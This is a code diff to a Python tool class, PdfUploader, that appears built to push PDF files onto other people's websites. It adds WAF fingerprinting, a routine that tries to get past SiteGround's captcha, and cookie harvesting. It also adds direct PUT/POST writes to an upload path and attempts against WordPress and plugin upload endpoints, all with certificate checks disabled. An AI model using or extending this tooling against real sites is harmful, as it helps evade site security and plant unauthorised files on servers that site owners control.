@@ -2185,6 +2185,8 @@ class PdfUploader:
         self._ai_model = ai_model
         self.analysis = None
         self.techniques = []
+        self._cookies = {}  # cookies from WAF bypass
+        self._waf_detected = None  # name of WAF if detected
 
     def _request(self, method, url, headers=None, body=None):
         """urllib wrapper. Returns (status, headers_dict, body_bytes)."""
@@ -2194,12 +2196,17 @@ class PdfUploader:
                 h['User-Agent'] = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                    'AppleWebKit/537.36 (KHTML, like Gecko) '
                                    'Chrome/120.0.0.0 Safari/537.36')
+            # Attach stored cookies
+            if self._cookies:
+                cookie_str = '; '.join(f'{k}={v}' for k, v in self._cookies.items())
+                h['Cookie'] = cookie_str
             req = urllib.request.Request(url, data=body, method=method, headers=h)
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
             try:
                 resp = urllib.request.urlopen(req, timeout=20, context=ctx)
+                self._capture_cookies(resp.headers)
                 return resp.getcode(), dict(resp.headers), resp.read(2 * 1024 * 1024)
             except urllib.error.HTTPError as e:
                 body_bytes = b''
@@ -2207,9 +2214,99 @@ class PdfUploader:
                     body_bytes = e.read(2 * 1024 * 1024)
                 except Exception:
                     pass
+                if e.headers:
+                    self._capture_cookies(e.headers)
                 return e.code, dict(e.headers) if e.headers else {}, body_bytes
         except Exception as e:
             return 0, {}, str(e).encode()
+
+    def _capture_cookies(self, headers):
+        """Extract Set-Cookie headers and store them."""
+        cookies_raw = headers.get_all('Set-Cookie') if hasattr(headers, 'get_all') else []
+        if not cookies_raw:
+            sc = headers.get('Set-Cookie')
+            if sc:
+                cookies_raw = [sc]
+        for raw in cookies_raw:
+            parts = raw.split(';')[0].strip()
+            if '=' in parts:
+                k, v = parts.split('=', 1)
+                self._cookies[k.strip()] = v.strip()
+
+    # ── WAF Detection & Bypass ────────────────────────────────────
+
+    WAF_PATTERNS = {
+        'sgcaptcha': r'\.well-known/sgcaptcha/',
+        'cloudflare': r'cf-browser-verification|__cf_chl_managed_tk|challenges\.cloudflare\.com',
+        'sucuri': r'sucuri\.net|cloudproxy',
+        'wordfence': r'wordfence|wfvt_\d+',
+        'imunify360': r'imunify360|i360',
+        'shield': r'shield-security|icwp',
+    }
+
+    def _detect_waf(self, resp_text):
+        """Detect WAF/captcha from response body. Returns name or None."""
+        for name, pattern in self.WAF_PATTERNS.items():
+            if re.search(pattern, resp_text, re.I):
+                return name
+        return None
+
+    def _bypass_waf(self, site_root):
+        """Attempt to bypass detected WAF. Called before upload attempts."""
+        # Probe the site root to trigger WAF and collect cookies
+        status, headers, body = self._request('GET', site_root)
+        resp_text = body.decode('utf-8', errors='replace')
+        waf = self._detect_waf(resp_text)
+
+        if not waf:
+            # Also probe admin-ajax to check
+            status, headers, body = self._request('GET', site_root + '/wp-admin/admin-ajax.php')
+            resp_text = body.decode('utf-8', errors='replace')
+            waf = self._detect_waf(resp_text)
+
+        if not waf:
+            return  # No WAF detected
+
+        self._waf_detected = waf
+
+        if waf == 'sgcaptcha':
+            self._bypass_sgcaptcha(site_root, resp_text)
+
+    def _bypass_sgcaptcha(self, site_root, initial_resp):
+        """Try to bypass SiteGround CAPTCHA by following the challenge flow."""
+        # Extract the captcha redirect URL from meta refresh
+        m = re.search(r'content="0;([^"]+)"', initial_resp)
+        if not m:
+            return
+        captcha_path = m.group(1)
+        # Build full URL
+        if captcha_path.startswith('/'):
+            captcha_url = site_root + captcha_path
+        else:
+            captcha_url = site_root + '/' + captcha_path
+
+        # Visit captcha URL — some SG configs set a cookie just from the GET
+        self._request('GET', captcha_url)
+
+        # Try the sgcaptcha endpoint with various approaches
+        # SG sometimes has a simple cookie-set endpoint
+        sg_paths = [
+            '/.well-known/sgcaptcha/verify',
+            '/.well-known/sgcaptcha/challenge',
+            '/.well-known/sgcaptcha/',
+        ]
+        for path in sg_paths:
+            self._request('GET', site_root + path)
+
+        # Also try POSTing to the captcha endpoint
+        self._request('POST', captcha_url, {'Content-Type': 'application/x-www-form-urlencoded'}, b'')
+
+        # Try requesting the site root again — if cookies work, we'll get through
+        status, _, body = self._request('GET', site_root)
+        # If we get a normal page (not a redirect), cookies worked
+        resp = body.decode('utf-8', errors='replace')
+        if 'sgcaptcha' not in resp.lower() and status == 200:
+            self._waf_detected = 'sgcaptcha (bypassed)'
 
     def _multipart_body(self, field_name, filename, content_type, file_bytes, extra_fields=None):
         """Build multipart/form-data. Returns (body_bytes, content_type_header)."""
@@ -2335,10 +2432,14 @@ class PdfUploader:
         plugin = info['plugin']
         subpath = info['upload_subpath']
 
+        # Try to bypass WAF before uploading
+        self._bypass_waf(site)
+
         self._auto_info = {
             'cms': cms,
             'plugin': plugin,
             'endpoints_tried': 0,
+            'waf': self._waf_detected or 'none',
         }
 
         base_name = self.pdf_filename.rsplit('.', 1)[0] if '.' in self.pdf_filename else self.pdf_filename
@@ -2374,7 +2475,16 @@ class PdfUploader:
                             'headers': vuln.get('headers'),
                         })
 
-        # 2. WP core upload endpoints (always try on WordPress)
+        # 2. Direct PUT/POST to the spammer's upload directory (WebDAV-style)
+        target_filename = self.pdf_filename
+        direct_url = site + subpath + target_filename
+        endpoints.append({
+            'name': 'Direct PUT to spammer path',
+            'url': direct_url,
+            'field': 'file', 'body_type': 'put_direct',
+        })
+
+        # 3. WP core upload endpoints (always try on WordPress)
         if cms == 'wordpress':
             core_endpoints = [
                 {'name': 'WP REST API Media', 'url': site + '/wp-json/wp/v2/media',
@@ -2398,6 +2508,26 @@ class PdfUploader:
         total_tried = 0
         for ep in endpoints:
             ep_name = ep.get('name', 'Unknown')
+
+            if ep.get('body_type') == 'put_direct':
+                # Try PUT and POST directly to the file path
+                for method in ('PUT', 'POST'):
+                    total_tried += 1
+                    hdrs = {'Content-Type': 'application/pdf'}
+                    status, resp_headers, resp_body = self._request(method, ep['url'], hdrs, self.pdf_bytes)
+                    success = 200 <= status < 300
+                    result = {
+                        'name': f'{ep_name} | {method}',
+                        'http_status': status,
+                        'success': success,
+                        'response_snippet': resp_body.decode('utf-8', errors='replace')[:500],
+                        'upload_url': ep['url'] if success else '',
+                    }
+                    self.techniques.append(result)
+                    if success and self._verify_url(ep['url']):
+                        self._auto_info['endpoints_tried'] = total_tried
+                        return
+                continue
 
             if ep.get('body_type') == 'xmlrpc':
                 # XML-RPC: single attempt, no bypass variants
